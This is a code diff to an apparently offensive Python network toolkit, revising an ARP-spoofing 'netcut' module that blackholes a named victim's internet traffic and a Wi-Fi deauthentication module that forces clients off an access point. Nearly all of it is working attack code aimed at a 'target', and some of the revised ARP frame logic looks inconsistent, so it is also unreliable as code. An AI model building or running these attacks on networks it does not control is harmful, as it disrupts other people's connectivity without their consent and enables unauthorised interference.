@@ -6,6 +6,7 @@ import os, re, time, socket, threading, subprocess, sys, signal
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 DATA = os.path.join(ROOT, "data")
 
+# CLI presets from hkall are read via __main__.GINJ (see _ask). None here.
 def _ask(prompt, default="", ginj=None):
     if ginj:
         return str(ginj.pop(0))
@@ -258,41 +259,42 @@ def mod_netcut():
     except ValueError: print("bad seconds"); return
     if rng > 120:
         print("cap 120s — edit manual kalau butuh lebih."); rng = 120
+    # open raw AF_PACKET socket (needs root). do it before resolving so we bail fast.
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+        s.bind((iface, 0))
+    except OSError as e:
+        print(f"raw socket bind {iface} gagal ({e}) — pastikan root + interface benar."); return
     def mac(ip):
         out = subprocess.run(["cat", "/proc/net/arp"], capture_output=True, text=True).stdout
         for line in out.splitlines()[1:]:
             f = line.split()
-            if len(f) >= 4 and f[0] == ip: return f[3]
+            if len(f) >= 4 and f[0] == ip: return f[3].replace(":", "")  # strip colons for fromhex
         return None
     print("resolving target MAC...")
-    vmac = mac(vi)
+    vmac = mac(vi)  # raw hex: "001122334455"
     if not vmac:
-        print(f"target {vi} not in ARP table — ping/{vi} dulu, atau pastikan aktif di LAN.")
-        return
-    print(f"target {vi} @ {vmac}")
-    gmac = mac(gw)
-    if not gmac:
-        print(f"gateway {gw} not in ARP table — fallback ff:ff:ff:ff:ff:ff")
-        gmac = "ff:ff:ff:ff:ff:ff"
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-    s.bind((iface, 0))
-    DUMMY_MAC = "00:00:00:00:00:00"   # nonexistent -> target outbound ARP to gw fails
-    import struct
-    def arp(dst_mac, target_mac, sender_mac, target_ip, sender_ip, op):
-        p = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
-        p += bytes.fromhex(sender_mac) + socket.inet_aton(sender_ip)
-        p += bytes.fromhex(target_mac) + socket.inet_aton(target_ip)
-        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(target_mac) + b"\x08\x06" + p
-    def broadcast(pkt):
-        s.send(pkt)
+        print(f"target {vi} not in ARP table — ping {vi} dulu, atau pastikan aktif di LAN."); return
+    print(f"target {vi} @ {':'.join(vmac[i:i+2] for i in range(0,12,2))}")
+    gmac_raw = mac(gw)  # raw hex
+    if not gmac_raw:
+        print(f"gateway {gw} not in ARP table — fallback ff:ff:ff:ff:ff:ff"); gmac_raw = "ffffffffffff"
+    DUMMY_MAC = "000000000000"
+    import struct as _st
+    def arp_frame(dst_hex, src_hex, target_ip, sender_ip, op):
+        p = _st.pack("!HHBBH", 1, 0x0800, 6, 4, op)
+        p += bytes.fromhex(src_hex) + socket.inet_aton(sender_ip)
+        p += bytes.fromhex(dst_hex) + socket.inet_aton(target_ip)
+        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(dst_hex) + b"\x08\x06" + p
+    def broadcast(pkt): s.send(pkt)
     # cut: victim believes gw is at UNREACHABLE mac -> traffic to gw blackholes
     def cut_once():
-        broadcast(arp(DUMMY_MAC, vmac, DUMMY_MAC, gw, vi, 2))          # vi: gw <= dummy
-        broadcast(arp(DUMMY_MAC, gmac, DUMMY_MAC, vi, gw, 2))          # gw: vi  <= dummy (balik)
+        broadcast(arp_frame(DUMMY_MAC, DUMMY_MAC, gw, vi, 2))   # vi: gw <= dummy
+        broadcast(arp_frame(DUMMY_MAC, DUMMY_MAC, vi, gw, 2))   # gw: vi  <= dummy
     def restore():
         for _ in range(3):
-            broadcast(arp(gmac, vmac, gmac, gw, vi, 2))                # vi: gw benar
-            broadcast(arp(vmac, gmac, vmac, vi, gw, 2))                # gw: vi benar
+            broadcast(arp_frame(vmac, gmac_raw, gw, vi, 2))     # vi: gw benar
+            broadcast(arp_frame(gmac_raw, vmac, vi, gw, 2))       # gw: vi benar
             time.sleep(0.1)
     print(f"cutting internet {vi} for {rng}s (arp gw->dummy). ctrl-c = restore segera.")
     t0 = time.time()
@@ -304,6 +306,7 @@ def mod_netcut():
         pass
     finally:
         restore()
+        s.close()
         _save("netcut", vi, f"cut {rng}s gw={gw} restored")
         print("restored ARP — target online kembali.")
 
@@ -313,9 +316,9 @@ def mod_deauth():
     if os.geteuid() != 0:
         print("need root. abort"); return
     import subprocess as sp
-    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
     ap_mac = _ask("AP bssid (mac router):").strip().lower()
     client = _ask("client mac (target; blank=all):").strip().lower()
+    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
     cnt = int(_ask("deauth count [10]: ").strip() or "10")
     if not ap_mac: print("need AP bssid"); return
     # prefer aireplay-ng (reliable) kalau ada
@@ -342,11 +345,13 @@ def mod_deauth():
     except OSError as e:
         print(f"bind {iface} gagal ({e}) — sehingga monitor iface."); return
     # 802.11 deauth: type/mgmt (0x00 0x00), flags, duration, da, sa, bssid, seq, reason
-    da = bytes.fromhex(client.replace(":", "")) if client else b"\xff\xff\xff\xff\xff\xff"
-    sa = bytes.fromhex(ap_mac.replace(":", ""))
+    client_raw = client.replace(":", "") if client else ""
+    ap_raw = ap_mac.replace(":", "")
+    da = bytes.fromhex(client_raw) if client_raw else b"\xff\xff\xff\xff\xff\xff"
+    sa = bytes.fromhex(ap_raw)
     bssid = sa
     frame = b"\x00\x00\x00\x00\xff" + da + sa + bssid + b"\x00\x00\x07\x00"
-    print(f"sending {cnt} deauth frames (da={da.hex(':') if client else 'broadcast'}, sa={ap_mac})...")
+    print(f"sending {cnt} deauth frames (da={':'.join(client_raw[i:i+2] for i in range(0,12,2)) if client_raw else 'broadcast'}, sa={ap_mac})...")
     for _ in range(cnt):
         try:
             s.send(frame)
